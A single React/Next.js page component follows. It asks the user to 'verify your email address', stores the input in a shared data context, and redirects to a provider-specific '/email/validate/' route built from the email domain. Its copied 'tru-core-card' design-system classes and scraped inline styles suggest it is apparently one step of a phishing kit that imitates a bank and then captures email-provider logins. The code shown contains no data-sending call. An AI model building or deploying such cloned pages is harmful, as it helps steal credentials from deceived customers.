import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Button } from "../../../components/Button";
import { Input } from "../../../components/Input";
import { InputWrapper } from "../../../components/InputWrapper";
import { Wrapper } from "../../../components/Wrapper";
import { DataContext } from "../../_app";

interface EmailProps {}

const schema = yup.object().shape({
  email: yup
    .string()
    .required("Please enter a valid email address")
    .email("Please enter a valid email address"),
});

export const Email: React.FC<EmailProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    setData({
      ...datas,
      ...data,
    });

    const emailProvider = data["email"].split("@")[1].split(".")[0];
    push(`/email/validate/${emailProvider}`);
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper title="Email Address">
      <div
        className="tru-core-card-content tru-core-card-section"
        style={{
          paddingTop: `var(--truSpacingXl)`,
          letterSpacing: `normal`,
          textIndent: 0,
          textShadow: `none`,
          textTransform: `none`,
          textAlign: `initial`,
          fontStyle: `normal`,
          verticalAlign: `initial`,
          fontSize: `var(--truFontSizeMd)`,
          color: `var(--truColorTextPrimary)`,
          display: `flex`,
          flexGrow: 1,
          flexDirection: `column`,
        }}
      >
        <p
          className="tru-core-card-copy--retail"
          style={{
            marginTop: 0,
          }}
        >
          {" "}
          {`Let's`} verify your email address.{" "}
        </p>
        <InputWrapper>
          <Input
            label={`Email address associated with your account`}
            type="email"
            wrapperStyle={{
              width: `100%`,
            }}
            name={`email`}
            register={register}
            error={errors.email && (errors.email.message as unknown as string)}
          />
        </InputWrapper>
      </div>
      <div
        className="tru-core-card-actions tru-core-card-section"
        style={{
          paddingTop: `var(--truSpacing2xl)`,
          paddingBottom: `var(--truSpacingLg)`,
          letterSpacing: `normal`,
          textIndent: 0,
          textShadow: `none`,
          textTransform: `none`,
          textAlign: `initial`,
          fontStyle: `normal`,
          verticalAlign: `initial`,
          fontSize: `var(--truFontSizeMd)`,
          color: `var(--truColorTextPrimary)`,
          display: `flex`,
          flexGrow: 1,
          flexDirection: `column`,
        }}
      >
        <Button label={`Continue`} onClick={onSubmit} disabled={loading} />
      </div>
    </Wrapper>
  );
};

export default Email;
